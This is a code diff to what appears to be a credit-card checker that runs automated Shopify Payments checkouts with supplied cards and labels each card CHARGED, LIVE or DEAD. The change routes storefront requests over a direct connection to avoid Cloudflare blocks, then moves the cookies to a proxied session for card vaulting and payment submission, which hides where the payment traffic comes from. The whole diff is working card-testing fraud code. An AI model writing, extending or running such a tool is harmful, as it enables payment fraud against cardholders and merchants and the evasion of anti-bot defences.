@@ -612,34 +612,46 @@ def _req_poll(session, ctx: _CheckoutContext, receipt_id: str) -> tuple:
     return ("ERROR", "Polling timed out")
 
 def run_requests_checkout(card: Card, store_url: str, proxy: str, prof) -> CheckResult:
-    """Run the entire checkout flow synchronously using requests."""
+    """Run the entire checkout flow synchronously using requests.
+    Hybrid approach: Use direct connection to bypass CF for storefront navigation,
+    then switch to user's proxy for payment submission.
+    """
     ctx = _CheckoutContext(store_url, prof, prof.get_headers("navigate"))
     ctx.headers["priority"] = "u=1, i"
     
-    session = requests.Session()
+    # Storefront session (Direct to avoid CF blocks on user proxy)
+    session_direct = requests.Session()
+    
+    # Payment session (Uses provided proxy)
+    session_proxy = requests.Session()
     if proxy:
         proxies = {"http": proxy, "https": proxy}
-        session.proxies.update(proxies)
+        session_proxy.proxies.update(proxies)
         
-    if not _req_init_session(session, ctx): return CheckResult("DEAD", "session_init_failed", "Shopify Payments", 0.0, store_url, card)
-    if not _req_find_product(session, ctx): return CheckResult("DEAD", "no_products_found", "Shopify Payments", 0.0, store_url, card)
-    if not _req_add_cart(session, ctx): return CheckResult("DEAD", "cart_failed", "Shopify Payments", ctx.price, store_url, card)
+    if not _req_init_session(session_direct, ctx): return CheckResult("DEAD", "session_init_failed", "Shopify Payments", 0.0, store_url, card)
+    if not _req_find_product(session_direct, ctx): return CheckResult("DEAD", "no_products_found", "Shopify Payments", 0.0, store_url, card)
+    if not _req_add_cart(session_direct, ctx): return CheckResult("DEAD", "cart_failed", "Shopify Payments", ctx.price, store_url, card)
     
-    if not _req_start_checkout(session, ctx): 
+    if not _req_start_checkout(session_direct, ctx): 
         err_msg = "checkout_start_failed"
         if "cloudflare" in ctx.last_html.lower(): err_msg = "checkout_cf_blocked"
         return CheckResult("DEAD", err_msg, "Shopify Payments", ctx.price, store_url, card)
         
-    if not _req_get_metadata(session, ctx): return CheckResult("DEAD", "token_extraction_failed", "Shopify Payments", ctx.price, store_url, card)
+    if not _req_get_metadata(session_direct, ctx): return CheckResult("DEAD", "token_extraction_failed", "Shopify Payments", ctx.price, store_url, card)
     
-    vault_id, vault_err = _req_vault_card(session, ctx, card)
+    # --- Switch to Proxy Session for Payments ---
+    # Transfer cookies to proxy session just in case
+    for cookie in session_direct.cookies:
+        session_proxy.cookies.set_cookie(cookie)
+        
+    vault_id, vault_err = _req_vault_card(session_proxy, ctx, card)
     if not vault_id: return CheckResult("DEAD", f"card_vault_failed: {vault_err}" if vault_err else "card_vault_failed", "Shopify Payments", ctx.price, store_url, card)
     
-    _req_negotiate_proposal(session, ctx, card)
-    receipt_id = _req_submit(session, ctx, card, vault_id)
+    _req_negotiate_proposal(session_proxy, ctx, card)
+    receipt_id = _req_submit(session_proxy, ctx, card, vault_id)
     if not receipt_id: return CheckResult("DEAD", "submission_rejected", "Shopify Payments", ctx.price, store_url, card)
     
-    category, detail = _req_poll(session, ctx, receipt_id)
+    category, detail = _req_poll(session_proxy, ctx, receipt_id)
     if category == "CHARGED": return CheckResult("CHARGED", detail, "Shopify Payments", ctx.price, store_url, card)
     elif category == "APPROVED": return CheckResult("LIVE", detail, "Shopify Payments", ctx.price, store_url, card)
     elif category == "DECLINED": return CheckResult("DEAD", detail, "Shopify Payments", ctx.price, store_url, card)
